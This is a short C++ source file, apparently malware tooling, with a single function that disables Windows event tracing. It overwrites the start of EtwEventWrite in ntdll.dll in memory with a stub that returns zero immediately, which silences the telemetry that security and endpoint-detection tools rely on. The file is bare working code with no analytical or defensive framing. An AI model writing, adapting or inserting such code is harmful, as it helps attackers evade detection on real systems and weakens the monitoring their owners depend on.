#include <windows.h>
#include <winternl.h>
#include <cstdint>
#include <cstring>

void mute_ti_etw() {
    HMODULE nt = GetModuleHandleW(L"ntdll.dll");
    if (!nt) return;
    FARPROC p = GetProcAddress(nt, "EtwEventWrite");
    if (!p) return;
    DWORD old;
    VirtualProtect(p, 8, PAGE_EXECUTE_READWRITE, &old);
    uint8_t stub[] = { 0x33, 0xC0, 0xC3 };
    memcpy(p, stub, sizeof stub);
    VirtualProtect(p, 8, old, &old);
    FlushInstructionCache(GetCurrentProcess(), p, 8);
}